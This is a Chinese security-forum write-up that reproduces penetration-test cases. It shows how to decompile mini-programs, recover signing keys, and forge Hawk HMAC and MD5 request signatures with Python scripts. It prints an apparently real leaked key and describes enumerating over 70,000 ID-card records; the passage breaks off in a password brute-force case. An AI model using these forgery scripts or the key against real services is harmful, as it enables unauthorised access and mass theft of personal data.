---
title: 手把手拆解：小程序/Web端加密鉴权绕过案例全复现
url: https://forum.butian.net/share/4664
source: 奇安信攻防社区
date: 2025-12-02
fetch_date: 2025-12-03T03:15:16.092634
---

# 手把手拆解：小程序/Web端加密鉴权绕过案例全复现

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 手把手拆解：小程序/Web端加密鉴权绕过案例全复现

本文通过六个真实渗透测试案例，深入剖析小程序与Web端常见的加密鉴权机制，手把手演示如何通过反编译、动态调试、JS逆向与脚本复现，精准定位加密逻辑、还原签名算法，并最终实现越权访问、信息遍历与账号接管

本文通过六个真实渗透测试案例，深入剖析小程序与Web端常见的加密鉴权机制，手把手演示如何通过反编译、动态调试、JS逆向与脚本复现，精准定位加密逻辑、还原签名算法，并最终实现越权访问、信息遍历与账号接管。
案例一
===
某天对小程序进行登录时发现登录进去这个接口有个personalid参数，发现也是返回了个人信息，一开始还以为是一个改id进行越权的简单漏洞，但是当我再次发包以后显示时间ts有问题，改了ts以后又说nonce有问题，到最后改了nonce，发现mac又有问题，这里就大概了解了大概的一个鉴权（ts，nonce要变化）
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755682113946-dceafaab-a912-4369-b28c-83eb095b686e.png)
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755677817374-a84c6767-e026-4f72-aa45-58bf32c9056b.png)
到这里就可以发现是mac参数进行的鉴权，由于是小程序，所以反编译一下源码
这里全局搜一下mac
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755678033023-339d69c3-2968-4ac7-8532-207e78d2db6e.png)
代码如下：
```php
var o = {
ts: a,
nonce: i.nonce || e.utils.randomString(6),
method: n,
resource: r.resource,
host: r.host,
port: r.port,
hash: i.hash,
ext: i.ext,
app: i.app,
dlg: i.dlg
},
c = e.crypto.calculateMac("header", s, o),
h = 'Hawk id="' + s.id + '",ts="' + o.ts + '",nonce="' + o.nonce + '",mac="' + c + '"';
```
这里的o是ts,nonce,method,resource,host,port这些组合起来的
可以看见mac是等于c的，其实就是请求方式和url及认证头里面的东西组合起来进行了一个加密
跟进一下e.crypto.calculateMac
全局搜索
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755678602462-d6787919-d830-4eef-991c-57eb17235347.png)
加密逻辑
```php
e.crypto = {
headerVersion: "1",
algorithms: ["sha1", "sha256"],
calculateMac: function(t, r, n) {
var i = e.crypto.generateNormalizedString(t, n);
return s["Hmac" + r.algorithm.toUpperCase()](i, r.key).toString(s.enc.Base64)
}
```
这里对`calculateMac` 函数分析，这个函数是该对象的核心，它接受三个参数：
- `t`: \*\*原始数据\*\*。
- `r`: \*\*包含算法和密钥的对象\*\*。这个对象内部有 `r.algorithm`（指定哈希算法，例如`"sha1"`或`"sha256"`) 和 `r.key`（用于HMAC计算的密钥）。
- `n`: 也就是o。
```php
var i = e.crypto.generateNormalizedString(t, n);
```
- 首先，调用 `e.crypto.generateNormalizedString` 函数，传入 `t` 和 `n` 参数。
- 这个函数将上一步准备好的 `o` 对象（以及其他输入，如 `t`）按照 Hawk 协议的特定规则进行\*\*排序\*\*和\*\*拼接\*\*，生成一个唯一的、标准化的字符串。这样的话就确保不管数据在原始对象中的顺序如何，只要内容不变，生成的标准化字符串就始终一致。这对于\*\*防止因数据顺序不一致而导致的签名验证失败\*\*
```php
return s["Hmac" + r.algorithm.toUpperCase()](i, r.key).toString(s.enc.Base64)
```
- 这行代码是实际进行HMAC计算和格式化的部分。
- `r.algorithm.toUpperCase()`: 将传入的算法名称转换为大写，例如 `sha1` 变为 `SHA1`。
- `"Hmac" + r.algorithm.toUpperCase()`: 动态构建HMAC算法名称，例如 `"HmacSHA1"` 或 `"HmacSHA256"`。
- `s["Hmac..."](i, r.key)`: 使用标准化字符串 `i` 和密钥 `r.key` 来调用 HMACC 算法进行计算，返回一个HMAC结果。
- `.toString(s.enc.Base64)`: 将计算出的HMAC结果转换为\*\*Base64编码\*\*的字符串，并作为函数的最终返回值。
这里就需要找到key了
一开始全局搜索key但是太多了
然后联想到一般key都会放在配置文件里面
搜了一下config
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755680540150-eef96599-2328-474b-aa30-f4044076c308.png)
写个脚本试一下能不能使用
```php
import base64
import hmac
import hashlib
import time
def generate\_normalized\_string(header\_type, artifacts):
"""生成 Hawk 规范化字符串"""
n = f"hawk.1.{header\_type}\n"
n += f"{artifacts['ts']}\n"
n += f"{artifacts['nonce']}\n"
n += f"{artifacts['method'].upper()}\n"
n += f"{artifacts['resource']}\n"
n += f"{artifacts['host'].lower()}\n"
n += f"{artifacts['port']}\n"
n += f"{artifacts['hash']}\n" # 空字符串
# 无 ext 参数
n += "\n"
# 无 app 和 dlg 参数
return n
def calculate\_mac(credentials, artifacts):
"""计算 Hawk MAC 值"""
normalized\_str = generate\_normalized\_string("header", artifacts)
print("规范化字符串:")
print("----------------------")
print(normalized\_str)
print("----------------------")
key\_bytes = credentials["key"].encode("utf-8")
msg\_bytes = normalized\_str.encode("utf-8")
# 使用 SHA-256
hmac\_digest = hmac.new(key\_bytes, msg\_bytes, hashlib.sha256).digest()
return base64.b64encode(hmac\_digest).decode("utf-8")
# 输入参数
credentials = {
"id": "wasx",
"key": "edb8bc95-a000-4ca0-81b8-dd2145050a70F61FB1981510CE5D3988193864A328A3",
"algorithm": "sha256"
}
timestamp = time.time()
timestamps=int(timestamp)
artifacts = {
"ts": timestamps,
"nonce": "6a0d5d576135004ead6cf4795e5b6112", "method": "GET",
"resource": "xxxx/List/QueryByPersonalid?personalid=668223",
"host": "xxxxxxx",
"port": "443",
"hash": ""
}
# 计算并验证 MAC
calculated\_mac = calculate\_mac(credentials, artifacts)
print(f"计算 MAC: {calculated\_mac}")
```
发现可以使用，后续也是遍历了7w+的sfz信息
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755680638734-ad0e8cc7-aeac-419e-a72c-2e288db54829.png)
案例二
===
这里是一个预约功能的地方，需要填写个人信息包括了身份证号，可以看见有个personCode参数，后面跟了一串数字，然后下滑可以发现返回了个人信息，原本想遍历一下这个参数的，但是说参数过期了，想都不要想肯定是digest加密导致的
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755683298601-ec782853-b94c-4200-a806-8ac571339a7c.png)
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755683675519-d67a01c0-9050-46fa-80b5-80a30993449c.png)
一样的方法反编译一下
找到加密地方
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755683881978-66764297-ba40-4993-84d4-c3979da96eb1.png)
这个就比较简单了，只有有个hexMD5加密
简单分析一下代码
```php
var n = a.domainUrl(o.domain).match(/[^\/]+$/)[1]
```
这个正则表达式是匹配字符串末尾的非斜杠字符。例如，如果 `a.domainUrl(o.domain)` 返回 "[https://example.com/api](https://www.google.com/search?q=https://example.com/api)"，那么它会匹配 "api"
```php
u = o.url.includes("?") ? o.url.split("?")[0] : o.url
```
- 这行代码处理 URL，去除查询参数。
- `o.url.includes("?")`：检查 `o.url` 字符串是否包含问号 `?`。
- `o.url.split("?")[0]`：如果包含 `?`，则用 `?` 分割 URL 字符串，并取第一个部分，即问号之前的部分。
```php
digest: t.hexMD5("/".concat(n, "/") + u + s).toUpperCase()
```
- `"/".concat(n, "/")`：将字符串 `n` 用斜杠包裹起来。例如，如果 `n` 是 "api"，结果就是 "/api/"。
- `+ u + s`：将上一步的结果、不带参数的 URL `u` 和时间戳 `s` 拼接在一起。
- `t.hexMD5(...)`：调用一个名为 `t` 的对象上的 `hexMD5` 方法，对拼接后的字符串进行 MD5 哈希计算。MD5 是一种常见的哈希算法，用于生成一个唯一的、固定长度的散列值。
- `.toUpperCase()`：将生成的 MD5 散列值转换为大写。
分析完毕，开始写脚本：
```php
import re
import hashlib
import time
def calculate\_digest(domain, url, timestamp):
# 提取domain的最后路径片段
match = re.search(r'\/([^\/]+)\/?$', domain)
if not match:
raise ValueError("Invalid domain format")
n = match.group(1)
# 去掉URL的查询参数
u = url.split('?', 1)[0]
# 拼接字符串
s = f"/{n}/{u}{timestamp}"
# 计算MD5并转大写
return hashlib.md5(s.encode('utf-8')).hexdigest().upper()
# 示例调用
if \_\_name\_\_ == "\_\_main\_\_":
domain = 'xxxxx'
url = 'xxxxx'
timestamp = int(time.time() \* 1000) # 获取毫秒级时间戳
print("Timestamp:", timestamp)
digest = calculate\_digest(domain, url, timestamp)
print("digest:", digest)
```
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755687392007-faa6103b-cbbd-43d2-9a45-2f1825ebcd8e.png)
案例三
===
这里说一下快速找到加密点的方法
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1761906084328-e7b43de0-cf95-4ceb-86b2-0bc97d492936.png)
xhr打断点进行定位加密，选一个标志性的进行定位
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1761905671963-bd124ab0-e7e9-4a86-8d97-cc0ac82c7bed.png)
加入xhr
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1761905703895-d28fed34-40da-4697-ae66-bc7fc6cd3007.png)
刷新页面，断住了，接下来看它的作用域来寻找加密参数
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1761905776674-a974f000-9bca-4fe0-8723-a740d54b8ff5.png)
往上跟栈，发现加密参数
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1761905937463-8657d96b-acd3-488e-abb0-92d9657213cc.png)
再往上跟几个栈，找到最后一个出现加密参数的地方
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1761905982912-65df3c77-1182-4bcd-a264-1e9116adeaa8.png)
接下来直接上案例
这个是web端的js逆向，在查看网页源代码的时候发现了默认密码111111，并且没有验证码校验，这里大概的一个攻击思路就是固定密码爆破用户名
![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755751164100-4a0d968a-06f8-41c2-a899-10516e7239db.png)![](https://cdn.nlark.com/yuque/0/2025/png/44876878/1755751243870-24033534-0b46-4cb9-b8b1-1e144cc64fa5.png)
但是在抓包的时候发现，password被加密了
![](https://cdn.nlark.com/yuque/0/2025/png...